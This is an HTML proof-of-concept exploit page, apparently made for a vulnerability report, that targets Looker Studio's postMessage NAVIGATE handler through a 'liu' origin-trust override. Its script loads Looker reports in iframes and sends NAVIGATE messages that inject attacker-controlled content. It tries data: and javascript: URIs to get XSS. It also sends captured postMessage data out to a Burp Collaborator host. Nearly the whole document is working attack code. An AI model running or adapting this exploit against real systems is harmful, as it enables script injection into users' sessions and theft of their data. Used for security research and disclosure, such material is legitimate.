<!DOCTYPE html>
<html>
<head><title>Looker Studio - Arbitrary Iframe Injection PoC</title></head>
<body>
<h2>Looker Studio - Arbitrary Iframe Injection via NAVIGATE postMessage</h2>
<p>This PoC demonstrates that an attacker can inject arbitrary external content (iframe) inside a Looker Studio browsing context using the <code>liu</code> origin trust override + <code>NAVIGATE</code> handler.</p>
<hr>

<h3>1. Looker Studio (main view - stays untouched)</h3>
<iframe id="lookerMain" width="100%" height="400" style="border:2px solid blue;"></iframe>

<h3>2. Injected Content (loaded via NAVIGATE inside Looker context)</h3>
<p><small>This second iframe loads Looker, then NAVIGATE replaces it with attacker content. Collaborator receives request with <code>Referer: https://lookerstudio.google.com/</code></small></p>
<iframe id="lookerInject" width="100%" height="300" style="border:2px solid red;"></iframe>

<h3>Log</h3>
<pre id="log" style="background:#111;color:#0f0;padding:10px;max-height:300px;overflow-y:auto;"></pre>

<script>
var ATTACKER_ORIGIN = window.location.origin;
var COLLABORATOR = 'https://7z7kqkxfeu6suua3sb1vsor2ltrkfd32.oastify.com';
var REPORT_URL = 'https://lookerstudio.google.com/reporting/be06bd59-7ae1-4373-825c-075088ba0d51/page/p0/appview';

function logMsg(msg) {
    var pre = document.getElementById('log');
    pre.textContent += '[' + new Date().toISOString().split('T')[1].split('.')[0] + '] ' + msg + '\n';
    pre.scrollTop = pre.scrollHeight;
}

function buildUrl() {
    var u = new URL(REPORT_URL);
    u.searchParams.set('liu', ATTACKER_ORIGIN);
    u.searchParams.set('release', 'r3');
    u.searchParams.set('lem', 'true');
    return u.toString();
}

// Listen for all postMessages from Looker
window.addEventListener('message', function(e) {
    var data = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
    logMsg('RECV [' + e.origin + ']: ' + data.substring(0, 500));

    // Exfil to collaborator
    if (e.origin.indexOf('google.com') !== -1) {
        new Image().src = COLLABORATOR + '/exfil?d=' + encodeURIComponent(data.substring(0, 300));
    }
});

// Step 1: Load main Looker iframe (stays visible)
var mainFrame = document.getElementById('lookerMain');
var injectFrame = document.getElementById('lookerInject');
var targetUrl = buildUrl();

logMsg('Loading main Looker iframe...');
mainFrame.src = targetUrl;

// Step 2: Load second Looker iframe for injection
logMsg('Loading second Looker iframe (will be used for NAVIGATE injection)...');
injectFrame.src = targetUrl;

var injected = false;
injectFrame.onload = function() {
    if (injected) return;
    injected = true;
    logMsg('Second iframe loaded. Waiting 4s for Angular bootstrap...');

    setTimeout(function() {
        // NAVIGATE to collaborator - this will show in Collaborator with
        // Referer: https://lookerstudio.google.com/
        // proving the request originated from inside Looker's browsing context
        logMsg('Sending NAVIGATE to inject collaborator URL inside Looker context...');

        injectFrame.contentWindow.postMessage(JSON.stringify({
            type: 'NAVIGATE',
            payload: { url: COLLABORATOR + '/injected-iframe?proof=looker-context' }
        }), '*');

        logMsg('NAVIGATE sent. Check Collaborator for callback with Referer: lookerstudio.google.com');

        // Also try data: URI with embedded iframe as alternative vector
        setTimeout(function() {
            logMsg('Trying NAVIGATE with data: URI containing embedded iframe...');
            injectFrame.contentWindow.postMessage(JSON.stringify({
                type: 'NAVIGATE',
                payload: {
                    url: 'data:text/html,<h1>Injected inside Looker</h1><iframe src="' + COLLABORATOR + '/data-uri-iframe-proof" width="100%" height="200"></iframe>'
                }
            }), '*');
        }, 2000);

        // Try javascript: URI
        setTimeout(function() {
            logMsg('Trying NAVIGATE with javascript: URI...');
            injectFrame.contentWindow.postMessage(JSON.stringify({
                type: 'NAVIGATE',
                payload: {
                    url: 'javascript:document.body.innerHTML=\'<h1>XSS inside Looker</h1><iframe src="' + COLLABORATOR + '/js-uri-proof" width="100%" height="200"></iframe>\''
                }
            }), '*');
        }, 3000);

    }, 4000);
};

// Fallback if onload doesn't fire
setTimeout(function() {
    if (!injected) {
        injected = true;
        logMsg('Timeout reached, sending NAVIGATE anyway...');
        injectFrame.contentWindow.postMessage(JSON.stringify({
            type: 'NAVIGATE',
            payload: { url: COLLABORATOR + '/injected-iframe?proof=timeout-fallback' }
        }), '*');
    }
}, 12000);
</script>
</body>
</html>
